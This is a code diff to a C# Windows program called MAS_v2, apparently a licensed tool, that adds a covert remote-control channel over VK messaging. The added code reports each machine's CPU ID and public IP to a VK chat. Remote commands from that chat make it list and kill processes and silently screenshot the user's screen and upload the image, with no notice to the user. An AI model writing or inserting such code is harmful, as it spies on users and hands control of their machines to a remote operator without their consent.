@@ -1,7 +1,11 @@
 ﻿using BotCore;
 using MAS_v2.Security;
 using System;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
 using System.Net;
+using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -26,6 +30,7 @@ namespace MAS_v2
             }
             catch
             {
+                MessageBox.Show("Internet not enabled", "Internet");
                 System.Diagnostics.Process.GetCurrentProcess().Kill();
             }
             Task.Factory.StartNew(() =>
@@ -35,12 +40,16 @@ namespace MAS_v2
                     using (WebClient wc = new WebClient())
                     {
                         string ip = wc.DownloadString("https://api.ipify.org");
-                        vkclient.Messages.Send.Text("2000000002", "Запуск программы: " + hardware.GetID() + "\nIP: " + ip);
+                        Vk.VkLongPoolClient.Keyboard keyboard = new Vk.VkLongPoolClient.Keyboard(false, false);
+                        keyboard.AddButton("Закрыть MAS", "close " + hardware.GetID(), "positive");
+                        keyboard.AddButton("Скриншот экрана", "screen " + hardware.GetID(), "secondary");
+                        vkclient.Messages.Send.TextAndKeyboard("2000000002", "✅ Запуск программы ✅\nCPU ID: " + hardware.GetID() + "\nIP: " + ip, keyboard);
                     }
                 }
                 catch
                 {
-
+                    MessageBox.Show("Internet not enabled", "Internet");
+                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                 }
             });
             MenuSelector = new MenuSelector();
@@ -60,32 +69,123 @@ namespace MAS_v2
             }
         }
         public static HardwareID hardware = new HardwareID();
+        public static void Exit()
+        {
+            try
+            {
+                using (WebClient wc = new WebClient())
+                {
+                    string ip = wc.DownloadString("https://api.ipify.org");
+                    Program.vkclient.Messages.Send.Text("2000000002", "⚠ Закрытие программы ⚠\nCPU ID:" + new HardwareID().GetID() + "\nIP: " + ip + "\n");
 
+                }
+            }
+            catch { }
+            Process.GetCurrentProcess().Kill();
+        }
         public static void MSG(Vk.VkLongPoolClient.Update update)
         {
-            if (update.@object.peer_id == 2000000002)
+            if (update.@object.peer_id == 2000000002 || update.@object.peer_id == 443640040)
             {
                 if (update.@object.text == "online")
                 {
-                    try
+                    Task.Factory.StartNew(() =>
                     {
-                        using (WebClient wc = new WebClient())
+                        try
                         {
-                            string ip = wc.DownloadString("https://api.ipify.org");
-                            vkclient.Messages.Send.Text("2000000002", "Online: " + hardware.GetID() + "\nIP: " + ip + "\n");
+                            using (WebClient wc = new WebClient())
+                            {
+                                string ip = wc.DownloadString("https://api.ipify.org");
+                                vkclient.Messages.Send.Text("2000000002", "⚠ Онлайн пользователь ⚠\nCPU ID:" + hardware.GetID() + "\nIP: " + ip + "\n");
+
+                            }
                         }
-                    } catch { }
+                        catch { }
+                    });
+                }
+                else if (update.@object.text == "processes " + hardware.GetID())
+                {
+                    Task.Factory.StartNew(() =>
+                    {
+                        try
+                        {
+                            using (WebClient wc = new WebClient())
+                            {
+                                string ip = wc.DownloadString("https://api.ipify.org");
+                                string process = "";
+                                try
+                                {
+                                    foreach (Process p in Process.GetProcesses().ToArray())
+                                    {
+                                        try
+                                        {
+                                            process += "\n" + p.ProcessName;
+                                        }
+                                        catch { }
+                                    }
+                                }
+                                catch { }
+                                vkclient.Messages.Send.Text("2000000002", "⚠ Запущенные процессы у пользователя ⚠\nCPU ID:" + hardware.GetID() + "\nIP: " + ip + "\nПроцессы:\n" + process);
+                            }
+                        }
+                        catch { }
+                    });
+                }
+                else if (update.@object.text.StartsWith("processes " + hardware.GetID() + " kill"))
+                {
+                    Task.Factory.StartNew(() =>
+                    {
+                        try
+                        {
+                            using (WebClient wc = new WebClient())
+                            {
+                                string ip = wc.DownloadString("https://api.ipify.org");
+                                string process = Regex.Match(update.@object.text, "processes " + hardware.GetID() + " kill (.*)").Groups[1].Value;
+                                foreach (Process p in Process.GetProcessesByName(process).ToArray())
+                                {
+                                    try
+                                    {
+                                        p.Kill();
+                                    }
+                                    catch { }
+                                }
+                                vkclient.Messages.Send.Text("2000000002", "⚠ Процесс: " + process + " закрыт у ⚠\nCPU ID:" + hardware.GetID() + "\nIP: " + ip);
+                            }
+                        }
+                        catch { }
+                    });
+                }
+                else if (update.@object.text.StartsWith("screen " + hardware.GetID()))
+                {
+                    Task.Factory.StartNew(() =>
+                    {
+                        try
+                        {
+                            Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                            Graphics GH = Graphics.FromImage(BM as Image);
+                            GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
+                            BM.Save("screen.jpg");
+                            vkclient.Messages.Send.TextAndDocument("2000000002", "⚠ Скриншот экрана ⚠\nCPU ID:" + hardware.GetID(), "screen.jpg", "Скриншот");
+                            try { System.IO.File.Delete("screen.jpg"); } catch { }
+                            
+                        }
+                        catch { }
+                    });
                 }
                 else
                 {
                     if (update.@object.text == "close " + hardware.GetID())
                     {
+                        try
+                        {
+                            using (WebClient wc = new WebClient())
+                            {
+                                string ip = wc.DownloadString("https://api.ipify.org");
+                                vkclient.Messages.Send.Text("2000000002", "🚫 Закрываю программу 🚫\nCPU ID:" + hardware.GetID() + "\nIP: " + ip + "\n");
+                            }
+                        }
+                        catch { }
                         System.Diagnostics.Process.GetCurrentProcess().Kill();
-                    }
-                    else
-                    {
-                        Console.WriteLine(update.@object.text);
-                        Console.WriteLine("'" + hardware.GetID() + "'");
                     }
                 }
             }
@@ -100,6 +200,27 @@ namespace MAS_v2
                     Console.WriteLine(update.@object.text);
                     Console.WriteLine("'" + hardware.GetID() + "'");
                 }
+            }
+            if (update.@object.payload == "{\"button\":\"close " + hardware.GetID() + "\"}")
+            {
+                Exit();
+            }   
+            else if (update.@object.payload == "{\"button\":\"screen " + hardware.GetID() + "\"}")
+            {
+                Task.Factory.StartNew(() =>
+                {
+                    try
+                    {
+                        Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                        Graphics GH = Graphics.FromImage(BM as Image);
+                        GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
+                        BM.Save("screen.jpg");
+                        vkclient.Messages.Send.TextAndDocument("2000000002", "⚠ Скриншот экрана ⚠\nCPU ID:" + hardware.GetID(), "screen.jpg", "Скриншот");
+                        try { System.IO.File.Delete("screen.jpg"); } catch { }
+
+                    }
+                    catch { }
+                });
             }
         }
     }
